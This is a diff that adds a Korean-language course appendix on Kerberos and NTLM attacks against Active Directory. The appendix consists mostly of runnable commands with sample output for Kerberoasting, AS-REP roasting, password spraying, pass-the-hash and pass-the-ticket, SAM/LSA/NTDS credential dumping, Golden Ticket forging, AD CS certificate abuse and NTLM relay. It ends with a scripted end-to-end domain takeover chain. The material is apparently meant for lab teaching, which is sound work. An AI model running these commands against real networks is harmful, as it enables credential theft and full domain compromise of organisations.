@@ -845,3 +845,366 @@ graph LR
 
 **학생 액션**: linpeas 적용.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 05 Kerberos/NTLM 공격)
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | impacket-GetUserSPNs (Kerberoasting) | impacket |
+| s2 | impacket-GetNPUsers (AS-REP Roasting) | impacket |
+| s3 | kerbrute (사용자 enum) | kerbrute |
+| s4 | impacket-getTGT / getST (PtT) | impacket |
+| s5 | mimikatz / pypykatz (자격증명 dump) | pypykatz |
+| s6 | NetExec (CME 후속) | nxc |
+| s7 | certipy (AD CS abuse) | certipy |
+| s8 | Rubeus (Win) | (Win 환경 참고) |
+
+### 학생 환경 준비
+
+```bash
+# === Impacket (가장 표준) ===
+pip install impacket
+# 자동 설치 명령:
+# impacket-secretsdump
+# impacket-psexec / wmiexec / smbexec / atexec
+# impacket-GetUserSPNs / GetNPUsers
+# impacket-getTGT / getST / getPac
+# impacket-ntlmrelayx / smbserver / smbrelayx
+
+# === kerbrute (Go, AD enum) ===
+go install github.com/ropnop/kerbrute@latest
+
+# === pypykatz (Linux 에서 mimikatz 기능) ===
+pip install pypykatz
+
+# === NetExec (modern CME) ===
+pipx install git+https://github.com/Pennyw0rth/NetExec
+nxc --help
+
+# === certipy (AD CS abuse) ===
+pipx install certipy-ad
+certipy --help
+
+# === BloodHound (week04 에 이미) ===
+sudo apt install -y bloodhound bloodhound.py neo4j
+sudo systemctl start neo4j
+
+# === ADRecon ===
+git clone https://github.com/sense-of-security/ADRecon ~/adrecon
+```
+
+### Kerberoasting (TA0006 Credential Access)
+
+```bash
+# === 1. Service Principal Name (SPN) 가진 user 발견 ===
+impacket-GetUserSPNs corp.local/user:'Pa$$w0rd' -dc-ip 10.0.0.1
+# 출력:
+# ServicePrincipalName    Name        MemberOf  PasswordLastSet
+# MSSQLSvc/sql.corp.local sql-svc                ...
+# HTTP/web.corp.local     web-svc                ...
+
+# === 2. TGS hash 요청 ===
+impacket-GetUserSPNs corp.local/user:'Pa$$w0rd' -dc-ip 10.0.0.1 \
+    -request
+
+# 출력 (각 SPN 의 TGS-REP):
+# $krb5tgs$23$*sql-svc$CORP.LOCAL$MSSQLSvc/sql~corp.local*$abc123...
+
+# === 3. Hash crack (hashcat) ===
+echo '$krb5tgs$23$*sql-svc$...' > /tmp/hashes.txt
+hashcat -m 13100 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat --show /tmp/hashes.txt
+# sql-svc:Pa$$w0rd2026
+
+# === 4. 자동화 (한 줄) ===
+impacket-GetUserSPNs corp.local/user:'Pa$$w0rd' -dc-ip 10.0.0.1 -request \
+    -outputfile /tmp/spns.txt
+hashcat -m 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+### AS-REP Roasting (사전 인증 비활성 user)
+
+```bash
+# === 1. 사전 인증 비활성 user 찾기 ===
+impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.1 \
+    -no-pass \
+    -usersfile /tmp/users.txt
+
+# 출력 예:
+# $krb5asrep$23$user1@CORP.LOCAL:abc123...
+
+# === 2. Hash crack ===
+hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
+
+# === 3. kerbrute 와 결합 (사용자 enum + AS-REP) ===
+# 1) 사용자 enum
+kerbrute userenum -d corp.local --dc 10.0.0.1 \
+    /usr/share/seclists/Usernames/Names/names.txt
+# 출력: 유효 사용자 목록
+
+# 2) 그 사용자들에 대해 AS-REP 시도
+impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.1 -no-pass \
+    -usersfile valid-users.txt
+```
+
+### kerbrute (AD 사용자 enum + brute)
+
+```bash
+# === 1. 사용자 enum ===
+kerbrute userenum \
+    -d corp.local \
+    --dc 10.0.0.1 \
+    /usr/share/seclists/Usernames/Names/names.txt
+
+# 출력:
+# [+] VALID USERNAME: alice@corp.local
+# [+] VALID USERNAME: bob@corp.local
+
+# === 2. Password spray (1 password × N users) ===
+kerbrute passwordspray \
+    -d corp.local \
+    --dc 10.0.0.1 \
+    valid-users.txt 'Spring2026!'
+
+# 출력:
+# [+] VALID LOGIN: alice@corp.local:Spring2026!
+
+# === 3. Brute single user (N passwords × 1 user) ===
+kerbrute bruteuser \
+    -d corp.local \
+    --dc 10.0.0.1 \
+    /usr/share/wordlists/rockyou.txt admin
+
+# === 4. 결합 — username + password ===
+kerbrute bruteforce \
+    -d corp.local \
+    --dc 10.0.0.1 \
+    user-pass-combos.txt
+```
+
+### Pass-the-Ticket (PtT)
+
+```bash
+# === 1. TGT 획득 (정상 인증) ===
+impacket-getTGT corp.local/user:'Pa$$w0rd' -dc-ip 10.0.0.1
+# user.ccache 파일 생성
+
+# === 2. Ticket 사용 (다른 service 접근) ===
+export KRB5CCNAME=user.ccache
+impacket-psexec -k -no-pass corp.local/user@DC01
+
+# === 3. Service Ticket (PtS) ===
+impacket-getST -spn cifs/file-server.corp.local \
+    corp.local/user:'Pa$$w0rd' -dc-ip 10.0.0.1
+# user@cifs_file-server.ccache
+
+export KRB5CCNAME=user@cifs_file-server.ccache
+smbclient.py -k '@file-server.corp.local'
+
+# === 4. Golden Ticket (KRBTGT hash 필요) ===
+# 1) KRBTGT NT hash 획득 (DC dump 후)
+impacket-secretsdump -just-dc-ntlm 'admin:Pa$$w0rd@DC01' | grep krbtgt
+# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ABC123KRBTGTHASH...
+
+# 2) Domain SID 조회
+impacket-lookupsid corp.local/admin:'Pa$$w0rd'@DC01 0
+
+# 3) Golden Ticket 생성
+impacket-ticketer \
+    -nthash ABC123KRBTGTHASH \
+    -domain-sid S-1-5-21-XXX-XXX-XXX \
+    -domain corp.local \
+    administrator
+
+# 4) 사용 (영구적 admin access)
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass corp.local/administrator@DC01
+```
+
+### NetExec (NXC) — Pass-the-Hash + 다중 호스트
+
+```bash
+# === SMB enum (network-wide) ===
+nxc smb 10.0.0.0/24
+
+# === Pass-the-Hash (PtH) ===
+nxc smb 10.0.0.5 -u admin -H "abc123def456..."           # NTLM hash 만
+nxc winrm 10.0.0.5 -u admin -H "abc123..."
+
+# === SAM dump (자격증명 추출) ===
+nxc smb 10.0.0.5 -u admin -H "abc..." --sam
+
+# === LSA dump (캐시된 자격증명) ===
+nxc smb 10.0.0.5 -u admin -H "abc..." --lsa
+
+# === NTDS.dit dump (DC 만 — 모든 AD 사용자 hash) ===
+nxc smb DC01 -u admin -H "abc..." --ntds
+
+# === Module 사용 ===
+nxc smb 10.0.0.0/24 -u admin -H "abc..." -M wcc          # Windows Config check
+nxc smb 10.0.0.0/24 -u admin -H "abc..." -M shares       # SMB share enum
+nxc smb 10.0.0.0/24 -u admin -H "abc..." -M lsassy       # LSASS dump (자동)
+```
+
+### certipy (AD CS abuse — 가장 modern)
+
+```bash
+# === 1. AD CS template 발견 ===
+certipy find -u user@corp.local -p 'Pa$$w0rd' \
+    -dc-ip 10.0.0.1 -text
+
+# 출력 (vulnerable templates):
+# [+] Found 'User' template
+# [!] Template 'User' is vulnerable to ESC1
+#     Reason: Client Authentication + Subject Alt Name 조작 가능
+
+# === 2. ESC1 (Client Authentication + SAN) ===
+certipy req \
+    -u user@corp.local -p 'Pa$$w0rd' \
+    -ca CA-Server \
+    -template User \
+    -upn administrator@corp.local                          # admin 사칭
+
+# 출력: administrator.pfx (cert + private key)
+
+# === 3. ESC1 → TGT (administrator) ===
+certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
+# administrator.ccache + nthash
+
+# === 4. ESC4 (template ACL 약함) ===
+certipy template \
+    -u user@corp.local -p 'Pa$$w0rd' \
+    -template User \
+    -write-default-configuration
+
+# === 5. ESC8 (NTLM relay to AD CS) ===
+# Listener
+certipy relay -target 'http://CA-Server/certsrv/' -template DomainController
+
+# Trigger 다른 host 가 NTLM 으로 인증 시도 → relay 자동
+```
+
+### BloodHound (AD path 매핑 — week04 재사용)
+
+```bash
+# === 1. 데이터 수집 ===
+bloodhound-python -d corp.local \
+    -u user -p 'Pa$$w0rd' \
+    -ns 10.0.0.1 \
+    -c All \
+    --zip
+
+# === 2. Neo4j ===
+sudo systemctl start neo4j
+# http://localhost:7474
+
+# === 3. BloodHound GUI ===
+bloodhound &
+
+# === 4. Pre-built queries ===
+# - "Find Shortest Path to Domain Admin"
+# - "Find all Kerberoastable users"
+# - "Find AS-REP Roastable users"
+# - "Find Computers with Unconstrained Delegation"
+# - "Find DCSync rights"
+# - "Find Computers where Domain Users are Local Admin"
+
+# === 5. Custom Cypher query ===
+# Web UI Raw Query 에 입력:
+# MATCH p=shortestPath((u:User {name:"USER@CORP.LOCAL"})-[*1..]->(c:Computer {name:"DC01.CORP.LOCAL"}))
+# RETURN p
+```
+
+### NTLM Relay (impacket-ntlmrelayx)
+
+```bash
+# === Scenario: 다른 host 가 우리 attacker 에 NTLM 인증 → 자동 relay ===
+
+# 1) Listener (attacker)
+impacket-ntlmrelayx -smb2support -tf targets.txt
+# targets.txt: 인증 redirect 할 target 목록
+
+# 또는 specific target
+impacket-ntlmrelayx -smb2support -t smb://10.0.0.5
+
+# 2) Trigger (예: PetitPotam)
+git clone https://github.com/topotam/PetitPotam ~/petitpotam
+python3 ~/petitpotam/PetitPotam.py 10.0.0.100 10.0.0.5
+# 10.0.0.5 가 10.0.0.100 (attacker) 으로 NTLM 인증 시도
+# → ntlmrelayx 가 자동 forward → target 침투
+
+# 3) 결과 사용
+# ntlmrelayx 가 자동:
+# - SAM dump
+# - SMB shell access
+# - LDAP modification (사용자 추가 등)
+```
+
+### Domain takeover 시나리오 (자동 chain)
+
+```bash
+#!/bin/bash
+# /opt/scripts/ad-takeover.sh
+DOMAIN=corp.local
+DC=10.0.0.1
+USER=user
+PASSWORD='Pa$$w0rd'
+
+# === 1. 사용자 enum ===
+kerbrute userenum -d $DOMAIN --dc $DC \
+    /usr/share/seclists/Usernames/Names/names.txt > /tmp/users.txt
+
+# === 2. Password spray ===
+kerbrute passwordspray -d $DOMAIN --dc $DC \
+    /tmp/users.txt 'Spring2026!' > /tmp/valid.txt
+
+# === 3. AS-REP Roasting ===
+impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -no-pass \
+    -usersfile /tmp/users.txt > /tmp/asrep.txt
+
+hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force
+
+# === 4. Kerberoasting (정상 자격증명 후) ===
+impacket-GetUserSPNs $DOMAIN/$USER:$PASSWORD -dc-ip $DC -request \
+    -outputfile /tmp/spns.txt
+
+hashcat -m 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt --force
+
+# === 5. BloodHound 데이터 수집 ===
+bloodhound-python -d $DOMAIN -u $USER -p $PASSWORD -ns $DC -c All --zip
+
+# === 6. Path 분석 (수동 — Web UI) ===
+# "Shortest path to Domain Admin"
+
+# === 7. 발견된 path 따라 lateral ===
+nxc smb 10.0.0.0/24 -u $USER -p $PASSWORD --lsa
+
+# === 8. SAM/LSA dump 으로 admin hash 획득 ===
+impacket-secretsdump $DOMAIN/$USER:$PASSWORD@10.0.0.5
+
+# === 9. PtH 으로 admin 권한 ===
+nxc smb 10.0.0.5 -u admin -H 'NTLM_HASH'
+
+# === 10. DC 침해 ===
+impacket-secretsdump -just-dc 'admin:hash@'$DC
+
+# === 11. KRBTGT hash → Golden Ticket ===
+KRBTGT_HASH=$(grep krbtgt /tmp/ntds.dump | awk -F: '{print $4}')
+SID=$(impacket-lookupsid $DOMAIN/admin:hash@$DC 0 | grep -oP 'S-1-5-21-[0-9-]+')
+
+impacket-ticketer \
+    -nthash $KRBTGT_HASH \
+    -domain-sid $SID \
+    -domain $DOMAIN \
+    administrator
+
+# === 12. 영구적 admin access ===
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/administrator@$DC
+```
+
+학생은 본 5주차에서 **impacket suite + kerbrute + pypykatz + NetExec + certipy + BloodHound + ntlmrelayx** 7 도구로 Kerberos/NTLM 공격 chain (Kerberoasting → AS-REP → PtH/PtT → Golden Ticket → Domain takeover) 의 OSS 표준 흐름을 익힌다.
